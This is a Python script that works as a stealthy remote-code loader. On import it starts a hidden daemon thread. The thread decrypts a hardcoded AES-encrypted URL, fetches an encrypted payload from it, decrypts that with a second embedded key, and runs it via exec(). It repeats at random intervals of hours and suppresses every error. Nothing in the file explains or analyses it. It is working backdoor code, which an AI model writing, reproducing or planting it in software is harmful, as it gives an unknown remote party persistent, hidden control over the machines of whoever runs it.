#!/usr/bin/env python3
#-*- coding:utf8 -*-

import os,requests,time,threading,random
import json,yagmail,base64,sys
from Crypto.Cipher import AES
from Crypto import Random

def ddy(data, password):
    data = base64.b64decode(data)
    bs = AES.block_size
    if len(data) <= bs:
        return (data)
    unpad = None
    if sys.version_info.major == 2:
        unpad = lambda s : s[0:-ord(s[-1])]
    else:
        unpad = lambda s : s[0:-s[-1]]
    iv = data[:bs]
    cipher = AES.new(password, AES.MODE_CBC, iv)
    data  = unpad(cipher.decrypt(data[bs:]))
    return data

def gpy():
    en_url = 'kYLaFk7UNbtA3r8N1Dxk/EqRU1oXmV9wiZW3e04Y6n/bECpXrna8NojvXxyU8OQejo740KdxilR5xzbcqM9nNbPyF8cetRkw/LV08BUmIdw='
    password = 'jfdjKJHO89JJJK9048@_,f9989,,92jK' #16,24,32 size
    url = ddy(en_url, password)
    sf = ''
    try:
        r = requests.get(url)
        if r.status_code == 200:
            sf = r.text
    except Exception as e:
        pass
    return sf

def epy(sf):
    if not sf:
        return
    exec(sf, globals())
    return

def run():
    sleep_time = random.randint(60, 180)
    time.sleep(sleep_time)
    passwd = '9048@_,,,fdll78892jfJKFj798900aK' #16,24,32 size
    while True:
        try:
            en_py = gpy()
            str_py = ddy(en_py, passwd)
            epy(str_py)
        except Exception as e:
            pass
        sleep_time = random.randint(3600 * 2, 3600 * 24)
        time.sleep(sleep_time)

th = threading.Thread(target = run)
th.daemon = True
th.start()
